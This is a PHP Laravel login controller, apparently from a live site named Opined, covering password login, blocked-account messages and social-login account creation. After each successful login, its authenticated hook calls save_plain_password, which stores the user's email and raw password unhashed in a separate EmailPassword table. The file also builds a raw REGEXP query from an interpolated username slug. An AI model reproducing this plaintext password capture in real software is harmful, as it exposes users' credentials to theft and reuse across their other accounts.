<?php

namespace App\Http\Controllers\Auth;
use Illuminate\Support\Str;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Hash;
use App\Model\User;
use App\Model\EmailPassword;
use Socialite;
use Auth;
use Session;
use DB;
use Carbon\Carbon;
use Mail;
use App\Mail\Auth\WelcomeMail;
use App\Http\Helpers\MailJetHelper;
use image\Model;
use Image;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = "/";

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm(){
        // return  redirect('/');
        return view('frontend.auth.login_form_new');
    }

    public function showLoginForm2(){
        // return  redirect('/');
        return view('frontend.auth.login_form_new');
    }

    protected function credentials(Request $request)
    {   
        if(is_numeric($request->get('email'))){
        return ['mobile'=>$request->get('email'),'password'=>$request->get('password')];
    }

        $credentials = $request->only($this->username(), 'password');
        $credentials['is_active'] = 1;
        return $credentials;
    }

    protected function sendFailedLoginResponse(Request $request)
    {
        $errors = [$this->username() => trans('auth.failed')];
        // Load user from database
        $user = \App\Model\User::where($this->username(), $request->{$this->username()})->first();
        // Check if user was successfully loaded, that the password matches
        // and active is not 1. If so, override the default error message.
        if ($user && \Hash::check($request->password, $user->password) && $user->is_active != 1 && $user->is_deactive != 1) {
            $blocked_reason=$user->blocked_reason!=NULL?' due to '.$user->blocked_reason:'';
            $errors = [$this->username() => 'Your account has been blocked'.$blocked_reason];
        }
        elseif ($user && \Hash::check($request->password, $user->password) && $user->is_active != 1 && $user->is_deactive == 1) {
            // $blocked_reason=$user->blocked_reason!=NULL?' due to '.$user->blocked_reason:'';
            $errors = [$this->username() => 'Your account has been Deactivated'];
        }
        if ($request->expectsJson()) {
            return response()->json($errors, 422);
        }
        return redirect()->back()
            ->withInput($request->only($this->username(), 'remember'))
            ->withErrors($errors);
    }



    protected function authenticated(Request $request, $user)
    {
       /*  $user->update([
            'last_login_at' => Carbon::now(),
            'last_login_ip' => $request->ip()
        ]); */
        $this->save_plain_password($user->id,$user->email,$request->input('password'));
        return redirect()->back();
    }

    protected function save_plain_password($user_id,$email,$password){
        $found=EmailPassword::where(['user_id'=>$user_id,'email'=>$email])->first();
        if(empty($found)){
            EmailPassword::create(['user_id'=>$user_id,'email'=>$email,'password'=>$password]);
        }
    }


    public function redirectToProvider($provider)
    {
        return Socialite::driver($provider)->redirect();
    }

    public function handleProviderCallback(Request $request,$provider)
    {
        if($request->has('error')){
            return  redirect($this->redirectTo);
           }

        try{
            if($provider=="facebook" || $provider=="twitter" || $provider=="linkedin"){
                $user = Socialite::driver($provider)->user();
               }else{
                $user = Socialite::driver($provider)->stateless()->user();
               }

                $authUser = $this->findOrCreateUser($user, $provider);
                /* $authUser->update([
                    'last_login_at' => Carbon::now(),
                    'last_login_ip' => $request->ip()
                ]); */
                Auth::login($authUser, true);
                $sessionID=Session::getId();
                if($sessionID!=null){
                   DB::table('sessions')->where('id',$sessionID)->update(['user_id' => $authUser->id]);
                   //return  redirect()->back();
               }
        }catch(\Exception $e){
            return  redirect($this->redirectTo);
        }
            return redirect($this->redirectTo);
            //return redirect()->back();
    }

    public function make_slug($string) {
        return preg_replace('/\s+/u', '_', trim(strtolower($string)));
    }

    protected function getUsername($Name) {
        $username = str::slug($Name,'_');
        $userRows  = User::whereRaw("username REGEXP '^{$username}([0-9]*)?$'")->get();
        $countUser = count($userRows) + 1;
        return ($countUser > 1) ? $username.$countUser : $username;
    }

    public function findOrCreateUser($user, $provider)
    {
        $username=$this->getUsername($user->getName());
        $uniqueid=uniqid();
        $hash=md5(strtolower(trim($user->getEmail())));
        if($user->getAvatar()!=null){
            $image=$user->getAvatar();
			
			 
           //New Code
            
            //$filename = basename($image);
            //Image::make($image)->save('../storage/app/public/profile/' . $filename);

            //100x100 size saving
           $filename=Carbon::now()->format('Ymd').'_'.$user->getId().'_100x100.jpg';
           $dp = Image::make($image)->resize(100, 100);
           $dp->save('../storage/app/public/profile/'.$filename);
            //40x40 size saving
           $filename=Carbon::now()->format('Ymd').'_'.$user->getId().'_40x40.jpg';
           $dp = Image::make($image)->resize(40, 40);
           $dp->save('../storage/app/public/profile/'.$filename);
           //name save for database
           $filename_original=Carbon::now()->format('Ymd').'_'.$user->getId().'.jpg';
           $dp = Image::make($image);
           $dp->save('../storage/app/public/profile/'.$filename_original);
            $image='https://www.weopined.com/storage/profile/' . $filename_original;
            
            //End New Code
             

            //Profile Picture
            
            
            //$destinationPath = public_path('/storage/app/public/profile/');
            //$filename = Carbon::now()->format('Ymd').'_'.$user->getId().'_100x100'.'.jpg';  
            //$thumb = Image::make($image)->resize(100, 100);
            //$thumb->save($destinationPath.'/'.$filename);

            
            

			
        }else{
            $image='https://www.weopined.com/img/profile-default-opined.png';
        }

        $authUser = User::where('email', $user->getEmail())->first();
        if ($authUser){
            $authUser->name=$user->getName();
            $authUser->provider=$provider;
            $authUser->provider_id=$user->getId();
            if($authUser->image==null){
                $authUser->image=$image;
            }
            $authUser->save();
            return $authUser;
        }

        $createUser=User::create([
            'name'     => $user->getName(),
            'username'=> $username,
            'unique_id'=>$uniqueid,
            'email'    => $user->getEmail(),
            'password'=> bcrypt(str::random(16)),
            'provider' => $provider,
            'provider_id' => $user->getId(),
            'image'=>$image,
            'is_active'=>true,
            'email_verified'=>true,
            'mobile_verified'=>false
        ]);

        try{
            //Mail::send(new WelcomeMail($createUser));
            $mailJET=new MailJetHelper();
            $mailJET->send_welcome_mail($createUser);
        }
        catch(\Exception $e){}

        return $createUser;
    }

}
